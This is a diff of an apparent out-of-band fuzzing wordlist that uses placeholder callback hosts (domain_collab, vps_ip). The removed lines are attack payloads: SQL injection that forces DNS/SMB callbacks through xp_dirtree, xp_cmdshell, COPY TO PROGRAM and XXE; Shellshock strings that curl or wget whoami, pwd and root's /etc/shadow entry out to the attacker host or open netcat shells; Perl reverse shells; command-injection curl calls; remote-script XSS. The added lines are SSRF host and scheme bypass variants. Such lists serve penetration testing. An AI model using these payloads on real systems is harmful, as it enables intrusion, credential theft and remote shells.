@@ -1,632 +1,1151 @@
-$(`curl https://domain_collab/.testing/rce_vuln.txt?req=22jjffjbn`)
-$(`wget https://domain_collab/.testing/rce_vuln.txt`)
-$(`wget https://domain_collab/.testing/rce_vuln.txt?req=22jjffjbn`)
-%0a ping -i 30 vps_ip %0a
-//0://srff2.domain_collab;http://google.com:80/
-\0://srff2.domain_collab;http://google.com:80/
-%23.domain_collab
-%2edomain_collab
-%2f%2f.domain_collab
-%2 -n 21 vps_ip||`ping -c 21 vps_ip` #' |ping -n 21 vps_ip||`ping -c 21 vps_ip` #\" |ping -n 21 vps_ip
-%3F.domain_collab
-%40domain_collab
-%5c%5c.domain_collab
-:80@domain_collab
-" AND copy (SELECT '') to program 'nslookup domain_collab'--
-" AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-") AND copy (SELECT '') to program 'nslookup domain_collab'--
-") AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-")) AND copy (SELECT '') to program 'nslookup domain_collab'--
-")) AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-' AND copy (SELECT '') to program 'nslookup domain_collab'--
-' AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-') AND copy (SELECT '') to program 'nslookup domain_collab'--
-') AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-')) AND copy (SELECT '') to program 'nslookup domain_collab'--
-')) AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-` AND copy (SELECT '') to program 'nslookup domain_collab'--
-` AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-`) AND copy (SELECT '') to program 'nslookup domain_collab'--
-`) AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-`)) AND copy (SELECT '') to program 'nslookup domain_collab'--
-`)) AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-AND copy (SELECT '') to program 'nslookup domain_collab'--
-AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-" AND exec master..xp_dirtree '//domain_collab/a'--
-" AND exec master..xp_dirtree '//domain_collab/a'-- 
-") AND exec master..xp_dirtree '//domain_collab/a'--
-") AND exec master..xp_dirtree '//domain_collab/a'-- 
-")) AND exec master..xp_dirtree '//domain_collab/a'--
-")) AND exec master..xp_dirtree '//domain_collab/a'-- 
-' AND exec master..xp_dirtree '//domain_collab/a'--
-' AND exec master..xp_dirtree '//domain_collab/a'-- 
-') AND exec master..xp_dirtree '//domain_collab/a'--
-') AND exec master..xp_dirtree '//domain_collab/a'-- 
-')) AND exec master..xp_dirtree '//domain_collab/a'--
-')) AND exec master..xp_dirtree '//domain_collab/a'-- 
-` AND exec master..xp_dirtree '//domain_collab/a'--
-` AND exec master..xp_dirtree '//domain_collab/a'-- 
-`) AND exec master..xp_dirtree '//domain_collab/a'--
-`) AND exec master..xp_dirtree '//domain_collab/a'-- 
-`)) AND exec master..xp_dirtree '//domain_collab/a'--
-`)) AND exec master..xp_dirtree '//domain_collab/a'-- 
-AND exec master..xp_dirtree '//domain_collab/a'--
-AND exec master..xp_dirtree '//domain_collab/a'-- 
-" AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-" AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-") AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-") AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-")) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-")) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-' AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-' AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-') AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-') AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-')) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-')) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-` AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-` AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-`) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-`) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-`)) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-`)) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l' FROM dual--
-AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l' FROM dual-- 
-" AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-" AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-") AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-") AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-")) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-")) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-' AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-' AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-') AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-') AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-')) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-')) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-` AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-` AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-`) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-`) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-`)) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-`)) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-AND SELECT UTL_INADDR.get_host_address('domain_collab')--
-AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-BACKUP database master to disks='\\domain_collab\backupdb.dat'
-"><base href='http://domain_collab/'>
-"><base href='http://evil.com/'>
-() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
-() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
-() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
-() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
-() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
-() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
-() { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=5"
-() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
-() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
-() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
-() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
-() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
-() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
-() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=5"
-() { :;}; /bin/bash -c "sleep 1 && curl http://vps_ip:80/.testing/shellshock.txt?sleep=1&?vuln=6"
-() { :;}; /bin/bash -c "sleep 1 && curl http://vps_ip/.testing/shellshock.txt?sleep=1&?vuln=6"
-() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
-() { :;}; /bin/bash -c "sleep 3 && curl http://vps_ip:80/.testing/shellshock.txt?sleep=3&?vuln=7"
-() { :;}; /bin/bash -c "sleep 3 && curl http://vps_ip/.testing/shellshock.txt?sleep=3&?vuln=7"
-() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
-() { :;}; /bin/bash -c "sleep 6 && curl http://vps_ip:80/.testing/shellshock.txt?sleep=6&?vuln=8"
-() { :;}; /bin/bash -c "sleep 6 && curl http://vps_ip:80/.testing/shellshock.txt?sleep=9&?vuln=9"
-() { :;}; /bin/bash -c "sleep 6 && curl http://vps_ip/.testing/shellshock.txt?sleep=6&?vuln=8"
-() { :;}; /bin/bash -c "sleep 6 && curl http://vps_ip/.testing/shellshock.txt?sleep=9&?vuln=9"
-() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
-() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
-() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
-() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
-() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
-() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
-() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
-() { :;}; /bin/bash -c "wget http://vps_ip:80/.testing/shellshock.txt?vuln=4"
-() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
-() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
-() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
-() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
-() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
-() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
-() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=4"
-"><button name=xss type=submit formaction='https://domain_collab'>I get consumed!
-copy%20(SELECT '')%20to%20program%20'nslookup%20domain_collab'
-" copy (SELECT '') to program 'nslookup domain_collab'--
-" copy (SELECT '') to program 'nslookup domain_collab'-- 
-") copy (SELECT '') to program 'nslookup domain_collab'--
-") copy (SELECT '') to program 'nslookup domain_collab'-- 
-")) copy (SELECT '') to program 'nslookup domain_collab'--
-")) copy (SELECT '') to program 'nslookup domain_collab'-- 
-"; copy (SELECT '') to program 'nslookup domain_collab'--
-"; copy (SELECT '') to program 'nslookup domain_collab'-- 
-"||copy (SELECT '') to program 'nslookup domain_collab'--
-"||copy (SELECT '') to program 'nslookup domain_collab'-- 
-' copy (SELECT '') to program 'nslookup domain_collab'--
-' copy (SELECT '') to program 'nslookup domain_collab'-- 
-') copy (SELECT '') to program 'nslookup domain_collab'--
-') copy (SELECT '') to program 'nslookup domain_collab'-- 
-')) copy (SELECT '') to program 'nslookup domain_collab'--
-')) copy (SELECT '') to program 'nslookup domain_collab'-- 
-'; copy (SELECT '') to program 'nslookup domain_collab'--
-'; copy (SELECT '') to program 'nslookup domain_collab'-- 
-'||copy (SELECT '') to program 'nslookup domain_collab'--
-'||copy (SELECT '') to program 'nslookup domain_collab'-- 
-` copy (SELECT '') to program 'nslookup domain_collab'--
-` copy (SELECT '') to program 'nslookup domain_collab'-- 
-`) copy (SELECT '') to program 'nslookup domain_collab'--
-`) copy (SELECT '') to program 'nslookup domain_collab'-- 
-`)) copy (SELECT '') to program 'nslookup domain_collab'--
-`)) copy (SELECT '') to program 'nslookup domain_collab'-- 
-`; copy (SELECT '') to program 'nslookup domain_collab'--
-`; copy (SELECT '') to program 'nslookup domain_collab'-- 
-`||copy (SELECT '') to program 'nslookup domain_collab'--
-`||copy (SELECT '') to program 'nslookup domain_collab'-- 
-& curl http://domain_collab/.testing/rce.txt
-| curl http://domain_collab/.testing/rce.txt
-&& curl https://domain_collab/.testing/rce_vuln.txt
-; curl https://domain_collab/.testing/rce_vuln.txt
-curl https://domain_collab/.testing/rce_vuln.txt
- curl https://domain_collab/.testing/rce_vuln.txt ||`curl https://domain_collab/.testing/rce_vuln.txt` #' |curl https://domain_collab/.testing/rce_vuln.txt||`curl https://domain_collab/.testing/rce_vuln.txt` #\" |curl https://domain_collab/.testing/rce_vuln.txt
-curl https://domain_collab/.testing/rce_vuln.txt ||`curl https://domain_collab/.testing/rce_vuln.txt` #' |curl https://domain_collab/.testing/rce_vuln.txt||`curl https://domain_collab/.testing/rce_vuln.txt` #\" |curl https://domain_collab/.testing/rce_vuln.txt
-() { :;}; curl http://vps_ip:80/.testing/shellshock.txt?vuln=12
-() { :;}; curl http://vps_ip/.testing/shellshock.txt?vuln=12
-data://0://srff2.domain_collab;http://google.com:80/
-data://domain_collab
-data://ssrf1.domain_collab$google.com
-data://vps_ip
-data://vps_ip:80
-dict://0://srff2.domain_collab;http://google.com:80/
-dict://domain_collab
-dict://ssrf1.domain_collab$google.com
-dict://vps_ip
-dict://vps_ip:80
-#.domain_collab
+vps_ip:80
+.vps_ip:80
+/vps_ip:80
+@vps_ip:80
+\vps_ip:80
+#.vps_ip:80
+//vps_ip:80
+?.vps_ip:80
+\\vps_ip:80
+%2evps_ip:80
+%40vps_ip:80
+//.vps_ip:80
+///vps_ip:80
+\\.vps_ip:80
+\\\vps_ip:80
+%23.vps_ip:80
+%3F.vps_ip:80
+domain_collab
+`ping vps_ip`
 .domain_collab
+/domain_collab
+@domain_collab
+\domain_collab
+\\vps_ip:80\c$
+\\vps_ip:80\C$
+#.domain_collab
+//domain_collab
+?.domain_collab
+\\domain_collab
+ftp://vps_ip:80
+jar://vps_ip:80
+ogg://vps_ip:80
+rar://vps_ip:80
+zip://vps_ip:80
+%2edomain_collab
+%2f%2f.vps_ip:80
+%40domain_collab
+%5c%5c.vps_ip:80
+data://vps_ip:80
+dict://vps_ip:80
 //.domain_collab
 ///domain_collab
-//domain_collab
-/domain_collab
-?.domain_collab
 \\.domain_collab
 \\\domain_collab
-\\domain_collab
-\domain_collab
-domain_collab
-\\domain_collab\C$
-echo '<img src=https://domain_collab/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
-echo '<script src=https://domain_collab/.testing/xss.js></script>'// XXXXXXXXXXX
-& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > domain_collab
-&& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > domain_collab
-; echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > domain_collab
-| echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > domain_collab
-echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > domain_collab
-& echo "use Socket;$i="vps_ip";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
-&& echo "use Socket;$i="vps_ip";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
-; echo "use Socket;$i="vps_ip";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
-| echo "use Socket;$i="vps_ip";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
-echo "use Socket;$i="vps_ip";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
-<esi:include src="http://domain_collab/"/>
-<esi:include src="http://vps_ip/"/>
-;EXEC%20master..xp_dirtree%20'%5c%5cdomain_collab%5c'+--+
-exec%20master..xp_dirtree%20'//domain_collab/a'
-'; exec master..xp_cmdshell 'ping domain_collab'--
-; exec master..xp_cmdshell 'ping domain_collab'--
-exec master..xp_cmdshell 'ping+domain_collab'
-" exec master..xp_dirtree '//domain_collab/a'--
-" exec master..xp_dirtree '//domain_collab/a'-- 
-") exec master..xp_dirtree '//domain_collab/a'--
-") exec master..xp_dirtree '//domain_collab/a'-- 
-")) exec master..xp_dirtree '//domain_collab/a'--
-")) exec master..xp_dirtree '//domain_collab/a'-- 
-"; exec master..xp_dirtree '//domain_collab/a'--
-"; exec master..xp_dirtree '//domain_collab/a'-- 
-"||exec master..xp_dirtree '//domain_collab/a'--
-"||exec master..xp_dirtree '//domain_collab/a'-- 
-' exec master..xp_dirtree '//domain_collab/a'--
-' exec master..xp_dirtree '//domain_collab/a'-- 
-') exec master..xp_dirtree '//domain_collab/a'--
-') exec master..xp_dirtree '//domain_collab/a'-- 
-')) exec master..xp_dirtree '//domain_collab/a'--
-')) exec master..xp_dirtree '//domain_collab/a'-- 
-'; exec master..xp_dirtree '//domain_collab/a'--
-'; exec master..xp_dirtree '//domain_collab/a'-- 
-'||exec master..xp_dirtree '//domain_collab/a'--
-'||exec master..xp_dirtree '//domain_collab/a'-- 
-` exec master..xp_dirtree '//domain_collab/a'--
-` exec master..xp_dirtree '//domain_collab/a'-- 
-`) exec master..xp_dirtree '//domain_collab/a'--
-`) exec master..xp_dirtree '//domain_collab/a'-- 
-`)) exec master..xp_dirtree '//domain_collab/a'--
-`)) exec master..xp_dirtree '//domain_collab/a'-- 
-`; exec master..xp_dirtree '//domain_collab/a'--
-`; exec master..xp_dirtree '//domain_collab/a'-- 
-`||exec master..xp_dirtree '//domain_collab/a'--
-`||exec master..xp_dirtree '//domain_collab/a'-- 
-expect://0://srff2.domain_collab;http://google.com:80/
-expect://domain_collab
-expect://ssrf1.domain_collab$google.com
-expect://vps_ip
-expect://vps_ip:80
-file://0://srff2.domain_collab;http://google.com:80/
-file://domain_collab
-file://ssrf1.domain_collab$google.com
-file://vps_ip
 file://vps_ip:80
-"><form action=http://domain_collab><input type="submit">Click Me</input><select name=xss><option
-ftp://0://srff2.domain_collab;http://google.com:80/
-ftp://domain_collab
-ftp://ssrf1.domain_collab$google.com
-ftp://vps_ip
-ftp://vps_ip:80
-glob://0://srff2.domain_collab;http://google.com:80/
-glob://domain_collab
-glob://ssrf1.domain_collab$google.com
-glob://vps_ip
 glob://vps_ip:80
-//google.com+&@google.com#+@or.domain_collab/
-//google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.domain_collab/
-gopher://0://srff2.domain_collab;http://google.com:80/
-gopher://domain_collab
-gopher://ssrf1.domain_collab$google.com
-gopher://vps_ip
-gopher://vps_ip:80
-"><html><head></head><body><script>top.window.location = "https://domain_collab/hacked.html"</script></body></html>
-http://0://srff2.domain_collab;http://google.com:80/
-http://domain_collab
-http://google.com+&@google.com#+@or.domain_collab/
-http://google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.domain_collab/
-https://0://srff2.domain_collab;http://google.com:80/
-https://domain_collab
-/https://google.com@google.com/%2f.//or.domain_collab@google.com/%2f..
-http://ssrf1.domain_collab$google.com
-https://ssrf1.domain_collab$google.com
-https://vps_ip
-https://vps_ip:80
-http://vps_ip
 http://vps_ip:80
-"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;domain_collab&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
-"><img src='//domain_collab?
-"><img src='//domain_collab? 
-'\"><img src=//domain_collab/>
-"><img src='http://domain_collab/log.php?HTML=
-'\"><img src=//vps_ip:80/oobxss.js>
-"><input type='hidden' name='review_body' value="
-jar://0://srff2.domain_collab;http://google.com:80/
-jar://ssrf1.domain_collab$google.com
-jar://vps_ip:80
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://domain_collab\';document.body.appendChild(a)')
-ldap://0://srff2.domain_collab;http://google.com:80/
-ldap://ssrf1.domain_collab$google.com
 ldap://vps_ip:80
-LOAD_FILE('\\\\domain_collab\\a')
-" LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-" LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-") LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-") LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-")) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-")) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-"; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-"; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-"||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-"||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-' LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-' LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-') LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-') LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-')) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-')) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-'; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-'; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-'||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-'||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
